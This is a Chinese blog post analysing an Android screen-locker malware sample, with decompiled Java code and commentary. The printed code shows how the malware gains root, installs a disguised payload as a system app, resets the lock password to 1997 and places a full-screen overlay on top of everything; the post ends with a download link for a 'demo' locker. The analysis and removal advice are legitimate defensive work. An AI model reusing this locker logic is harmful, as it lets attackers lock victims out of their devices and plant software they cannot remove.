class=\"title\">onCreate</span><span class=\"params\">(Bundle paramBundle)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  LogCatBroadcaster.start(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">  <span class=\"keyword\">super</span>.onCreate(paramBundle);</span><br><span class=\"line\">  activiteDevice();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>继续跟进</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">activiteDevice</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  Intent localIntent = <span class=\"keyword\">new</span> Intent(<span class=\"string\">\"android.app.action.ADD_DEVICE_ADMIN\"</span>);</span><br><span class=\"line\">  NoClassDefFoundError localNoClassDefFoundError;</span><br><span class=\"line\">  <span class=\"keyword\">try</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    Class localClass = Class.forName(<span class=\"string\">\"com.h.MyAdmin\"</span>);</span><br><span class=\"line\">    ComponentName localComponentName = <span class=\"keyword\">new</span> ComponentName(<span class=\"keyword\">this</span>, localClass);</span><br><span class=\"line\">    localIntent.putExtra(<span class=\"string\">\"android.app.extra.DEVICE_ADMIN\"</span>, localComponentName);</span><br><span class=\"line\">    startActivityForResult(localIntent, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">catch</span> (ClassNotFoundException localClassNotFoundException)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    localNoClassDefFoundError = <span class=\"keyword\">new</span> NoClassDefFoundError(localClassNotFoundException.getMessage());</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">throw</span> localNoClassDefFoundError;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>操作打开激活设备管理器的界面</p>\n</blockquote>\n<blockquote>\n<p>来看看MyAdmin里面的代码。</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onEnabled</span><span class=\"params\">(Context paramContext, Intent paramIntent)</span></span></span><br><span class=\"line\"><span class=\"function\"> </span>&#123;</span><br><span class=\"line\">   String str = Integer.toString(<span class=\"number\">1997</span>);</span><br><span class=\"line\">   NoClassDefFoundError localNoClassDefFoundError;</span><br><span class=\"line\">   <span class=\"keyword\">try</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     Class localClass = Class.forName(<span class=\"string\">\"com.h.s\"</span>);</span><br><span class=\"line\">     Intent localIntent = <span class=\"keyword\">new</span> Intent(paramContext, localClass);</span><br><span class=\"line\">     localIntent.setFlags(<span class=\"number\">268435456</span>);</span><br><span class=\"line\">     paramContext.startService(localIntent);</span><br><span class=\"line\">     getManager(paramContext).resetPassword(str, <span class=\"number\">0</span>);</span><br><span class=\"line\">     <span class=\"keyword\">super</span>.onEnabled(paramContext, paramIntent);</span><br><span class=\"line\">     <span class=\"keyword\">return</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">catch</span> (ClassNotFoundException localClassNotFoundException)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     localNoClassDefFoundError = <span class=\"keyword\">new</span> NoClassDefFoundError(localClassNotFoundException.getMessage());</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">throw</span> localNoClassDefFoundError;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>用户只要一点击激活，那么就会设置一个密码为1997的锁屏密码，并且开启s这个服务。<br>跟进看看这个服务做了些什么。<br>s里面杂乱代码太多，我们直接来看主要的。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">c</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  WindowManager.LayoutParams localLayoutParams = <span class=\"keyword\">new</span> WindowManager.LayoutParams();</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams = localLayoutParams;</span><br><span class=\"line\">  Application localApplication = getApplication();</span><br><span class=\"line\">  getApplication();</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.mWindowManager = ((WindowManager)localApplication.getSystemService(Context.WINDOW_SERVICE));</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.type = <span class=\"number\">2010</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.format = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.flags = <span class=\"number\">1280</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.gravity = <span class=\"number\">49</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.x = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.y = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.width = -<span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.height = -<span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.mFloatLayout = LayoutInflater.from(getApplication()).inflate(<span class=\"number\">2130903041</span>, (ViewGroup)<span class=\"keyword\">null</span>);</span><br><span class=\"line\">  MediaPlayer localMediaPlayer = MediaPlayer.create(<span class=\"keyword\">this</span>, <span class=\"number\">2131099648</span>);</span><br><span class=\"line\">  localMediaPlayer.setLooping(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">  localMediaPlayer.start();</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.mWindowManager.addView(<span class=\"keyword\">this</span>.mFloatLayout, <span class=\"keyword\">this</span>.wmParams);</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.bt = ((Button)<span class=\"keyword\">this</span>.mFloatLayout.findViewById(<span class=\"number\">2131361794</span>));</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.ed = ((EditText)<span class=\"keyword\">this</span>.mFloatLayout.findViewById(<span class=\"number\">2131361792</span>));</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.tv = ((TextView)<span class=\"keyword\">this</span>.mFloatLayout.findViewById(<span class=\"number\">2131361793</span>));</span><br><span class=\"line\">  <span class=\"keyword\">try</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.ed.setHint(<span class=\"string\">\"宝贝在这输入密码！\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.tv.append(<span class=\"string\">\"恭喜中奖\"</span>);</span><br><span class=\"line\">    Button localButton = <span class=\"keyword\">this</span>.bt;</span><br><span class=\"line\">    <span class=\"number\">100000001</span> local100000001 = <span class=\"keyword\">new</span> View.OnClickListener()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"meta\">@Override</span></span><br><span class=\"line\">      <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(View paramView)</span></span></span><br><span class=\"line\"><span class=\"function\">      </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (s.<span class=\"keyword\">this</span>.ed.getText().toString().equals(s.<span class=\"keyword\">this</span>.des.decrypt(s.<span class=\"keyword\">this</span>.share.getString(<span class=\"string\">\"passw\"</span>, <span class=\"string\">\"\"</span>))))</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            s.access$L1000001(s.<span class=\"keyword\">this</span>).removeView(s.access$L1000002(s.<span class=\"keyword\">this</span>));</span><br><span class=\"line\">            s.<span class=\"keyword\">this</span>.stopSelf();</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">catch</span> (Exception localException)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    localButton.setOnClickListener(local100000001);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">catch</span> (Exception localException1)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      TextView localTextView = <span class=\"keyword\">this</span>.tv;</span><br><span class=\"line\">      StringBuffer localStringBuffer1 = <span class=\"keyword\">new</span> StringBuffer();</span><br><span class=\"line\">      StringBuffer localStringBuffer2 = <span class=\"keyword\">new</span> StringBuffer();</span><br><span class=\"line\">      localTextView.append(localStringBuffer2.append(<span class=\"string\">\"\\n\"</span>).append(<span class=\"keyword\">this</span>.des.decrypt(<span class=\"string\">\"e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c\"</span>)).toString() + <span class=\"keyword\">this</span>.share.getLong(<span class=\"string\">\"m\"</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      localException1 = localException1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span> (Exception localException2)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>把一个布局文件全屏显示在屏幕中，以及设置组件的文字，大小，DES加密等。<br>重点：布局文件的type和flags属性。<br>可以让这个View一直显示在栈的顶端，任何其他view都会在这个view的下面，导致锁屏的假象。</p>\n</blockquote>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><blockquote>\n<p>这个锁机程序的运行流程，打开，把so文件改成apk文件防盗/system/app目录，重启，apk自启动，设置view到栈的顶端。<br>由于已经是系统应用了，所以双清、恢复出厂化设置都清除不了</p>\n</blockquote>\n<h2 id=\"解决办法。\"><a href=\"#解决办法。\" class=\"headerlink\" title=\"解决办法。\"></a>解决办法。</h2><blockquote>\n<p>手机必须是开启usb调试，连接电脑adb shell进入手机base shell，<br>进入/system/app目录，源码中的命令有说把该目录弄成可读可写，我们就借用那个命令，然后再把恶意app删掉即可rm -fr xx.apk，最后reboot重启。</p>\n</blockquote>\n<h2 id=\"末尾\"><a href=\"#末尾\" class=\"headerlink\" title=\"末尾\"></a>末尾</h2><blockquote>\n<p>为了不让恶意程序流传，我就不分享源程序了。<br>不过我写了一个锁屏的demo，仅仅打开后仅仅锁屏1分钟然后退出，并无其他恶意操作。<br>链接: <a href=\"http://pan.baidu.com/s/1mi0roJA\" target=\"_blank\" rel=\"noopener\">http://pan.baidu.com/s/1mi0roJA</a> 密码: 6xqi</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。<br>当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。</p>\n</blockquote>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><blockquote>\n<p>锁机恶意程序一共分为两种：<br>1、通过设备管理器锁机加密码","more":"<br>2、设置一个view至栈顶端。</p>\n</blockquote>\n<h3 id=\"第一种\"><a href=\"#第一种\" class=\"headerlink\" title=\"第一种\"></a>第一种</h3><blockquote>\n<p>在上一篇博文中的安全卫士中有用到这个设备管理器。<br>原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代码，这里就不多说了。</p>\n</blockquote>\n<h3 id=\"第二种\"><a href=\"#第二种\" class=\"headerlink\" title=\"第二种\"></a>第二种</h3><blockquote>\n<p>这种也就是这篇博文主要讲的了。<br>ApkTool用来逆向反编译。<br>主要文件，混淆了方法名和类名。<br><img src=\"/images/1.8/01.png\" alt><br><img src=\"/images/1.8/02.png\" alt><br>重要的是ijm-x86.so这个so文件,后面有讲解<br>先从AndroidManifest来找到入口的Activity，c.class，然后来看看初始化的主要代码<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle paramBundle)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  LogCatBroadcaster.start(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">  <span class=\"keyword\">super</span>.onCreate(paramBundle);</span><br><span class=\"line\">  setContentView(<span class=\"number\">2130903040</span>);</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.b = ((Button)findViewById(<span class=\"number\">2131099651</span>));</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.t = ((EditText)findViewById(<span class=\"number\">0</span>));</span><br><span class=\"line\">  Button localButton = <span class=\"keyword\">this</span>.b;</span><br><span class=\"line\">  ButtonClickListener localButtonClickListener = <span class=\"keyword\">new</span> ButtonClickListener();</span><br><span class=\"line\">  localButton.setOnClickListener(localButtonClickListener);</span><br><span class=\"line\">  <span class=\"keyword\">try</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    StringBuffer localStringBuffer = <span class=\"keyword\">new</span> StringBuffer();</span><br><span class=\"line\">    d(<span class=\"keyword\">this</span>.path + <span class=\"string\">\"/zihao.l\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">catch</span> (IOException localIOException)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>this.path是当前内存卡的路径,也就是内存卡路径然后拼接zihao.l这个字符串，传给了d方法，并且模拟点击了ButtonClickListener，我们先来看看d方法。</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">d</span><span class=\"params\">(String paramString)</span></span></span><br><span class=\"line\"><span class=\"function\">  <span class=\"keyword\">throws</span> IOException</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  FileOutputStream localFileOutputStream = <span class=\"keyword\">new</span> FileOutputStream(paramString);</span><br><span class=\"line\">  InputStream localInputStream = getAssets().open(<span class=\"string\">\"ijm-x86.so\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">byte</span>[] arrayOfByte = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">1024</span>];</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = localInputStream.read(arrayOfByte); ; i = localInputStream.read(arrayOfByte))</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      localFileOutputStream.flush();</span><br><span class=\"line\">      localInputStream.close();</span><br><span class=\"line\">      localFileOutputStream.close();</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    localFileOutputStream.write(arrayOfByte, <span class=\"number\">0</span>, i);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>把ijm-x86.so文件复制到了sd卡中，并且命名为zihao.l<br>再来看看ButtonClickListener的点击事件。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ButtonClickListener</span></span></span><br><span class=\"line\"><span class=\"class\">  <span class=\"keyword\">implements</span> <span class=\"title\">View</span>.<span class=\"title\">OnClickListener</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ButtonClickListener</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Override</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(View paramView)</span></span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123;</span><br><span class=\"line\">    b localb = <span class=\"keyword\">new</span> b();</span><br><span class=\"line\">    localb.rootShell();</span><br><span class=\"line\">    a.deleteFile(c.<span class=\"keyword\">this</span>.file);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>执行了b对象中的rootShell方法。我们继续跟进。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rootShell</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  execCommand(<span class=\"keyword\">new</span> String[] &#123; <span class=\"string\">\"mount -o rw,remount /system\"</span>, <span class=\"string\">\"mount -o rw,remount /system/app\"</span>, <span class=\"string\">\"cp /sdcard/zihao.l /system/app/\"</span>, <span class=\"string\">\"chmod 777 /system/app/zihao.l\"</span>, <span class=\"string\">\"mv /system/app/zihao.l /system/app/zihao.apk\"</span>, <span class=\"string\">\"chmod 644 /system/app/zihao.apk\"</span>, <span class=\"string\">\"reboot\"</span> &#125;, <span class=\"keyword\">true</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>很明显，这个是执行shell命令的代码。<br>先把/system 和 /system/app 设置可读可写。<br>再从sd卡把zihao.l复制到/system/app中，并且命名zihao.apk。<br>最后再重启。<br>/system/app是存放系统app的，这个操作呢，是把zihao.apk设置成系统app，并且不可卸载。<br>这个zihao.apk也就是上面的ijm-x86.so，这个so文件其实一个apk程序，我们再来逆向分析一下这个ijm-x86.so。</p>\n</blockquote>\n<h3 id=\"分析第二层\"><a href=\"#分析第二层\" class=\"headerlink\" title=\"分析第二层\"></a>分析第二层</h3><blockquote>\n<p>同样的手法，找到app的入口Activity.</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle paramBundle)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  LogCatBroadcaster.start(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">  <span class=\"keyword\">super</span>.onCreate(paramBundle);</span><br><span class=\"line\">  activiteDevice();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>继续跟进</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">activiteDevice</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  Intent localIntent = <span class=\"keyword\">new</span> Intent(<span class=\"string\">\"android.app.action.ADD_DEVICE_ADMIN\"</span>);</span><br><span class=\"line\">  NoClassDefFoundError localNoClassDefFoundError;</span><br><span class=\"line\">  <span class=\"keyword\">try</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    Class localClass = Class.forName(<span class=\"string\">\"com.h.MyAdmin\"</span>);</span><br><span class=\"line\">    ComponentName localComponentName = <span class=\"keyword\">new</span> ComponentName(<span class=\"keyword\">this</span>, localClass);</span><br><span class=\"line\">    localIntent.putExtra(<span class=\"string\">\"android.app.extra.DEVICE_ADMIN\"</span>, localComponentName);</span><br><span class=\"line\">    startActivityForResult(localIntent, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">catch</span> (ClassNotFoundException localClassNotFoundException)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    localNoClassDefFoundError = <span class=\"keyword\">new</span> NoClassDefFoundError(localClassNotFoundException.getMessage());</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">throw</span> localNoClassDefFoundError;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>操作打开激活设备管理器的界面</p>\n</blockquote>\n<blockquote>\n<p>来看看MyAdmin里面的代码。</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onEnabled</span><span class=\"params\">(Context paramContext, Intent paramIntent)</span></span></span><br><span class=\"line\"><span class=\"function\"> </span>&#123;</span><br><span class=\"line\">   String str = Integer.toString(<span class=\"number\">1997</span>);</span><br><span class=\"line\">   NoClassDefFoundError localNoClassDefFoundError;</span><br><span class=\"line\">   <span class=\"keyword\">try</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     Class localClass = Class.forName(<span class=\"string\">\"com.h.s\"</span>);</span><br><span class=\"line\">     Intent localIntent = <span class=\"keyword\">new</span> Intent(paramContext, localClass);</span><br><span class=\"line\">     localIntent.setFlags(<span class=\"number\">268435456</span>);</span><br><span class=\"line\">     paramContext.startService(localIntent);</span><br><span class=\"line\">     getManager(paramContext).resetPassword(str, <span class=\"number\">0</span>);</span><br><span class=\"line\">     <span class=\"keyword\">super</span>.onEnabled(paramContext, paramIntent);</span><br><span class=\"line\">     <span class=\"keyword\">return</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">catch</span> (ClassNotFoundException localClassNotFoundException)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     localNoClassDefFoundError = <span class=\"keyword\">new</span> NoClassDefFoundError(localClassNotFoundException.getMessage());</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">throw</span> localNoClassDefFoundError;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>用户只要一点击激活，那么就会设置一个密码为1997的锁屏密码，并且开启s这个服务。<br>跟进看看这个服务做了些什么。<br>s里面杂乱代码太多，我们直接来看主要的。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 